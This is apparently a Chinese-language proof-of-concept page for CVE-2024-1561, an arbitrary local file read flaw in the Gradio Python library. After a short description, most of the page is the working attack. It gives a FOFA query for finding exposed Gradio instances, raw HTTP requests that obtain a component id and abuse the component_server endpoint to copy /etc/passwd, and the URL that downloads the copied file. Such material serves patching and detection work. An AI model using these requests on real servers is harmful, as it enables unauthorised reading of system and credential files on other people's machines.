## Gradio存在任意文件读取漏洞(CVE-2024-1561)

Gradio是一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。Gradio 存在安全漏洞，该漏洞源于端点不正确地允许调用类上的任何方法，允许未经授权的本地文件读取访问，可能导致敏感信息泄露。

## fofa

```
body="gradio_mode"
```

## poc

获取components后面的id值

```
GET /config HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Host: xxx.xxx.xxx.xx
```

读取/etc/passwd

```
POST /component_server HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.3 Safari/605.1.1514.1.3 Ddg/14.1.3
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Host: xxx.xxx.xxx.xxx
Content-Type: application/json
Content-Length: 105

{"component_id": "上面获取的id","data": "/etc/passwd","fn_name": "move_resource_to_block_cache","session_hash": "a"}
```

![image-20240521195609464](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202405211956540.png)



读取该文件，实现任意文件读取

```
http://xxx.xxx.xxx.xxx/file=/tmp/gradio/916eb712d668cf14a35adf8179617549780c4070/passwd
```

![image-20240521195643782](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202405211956861.png)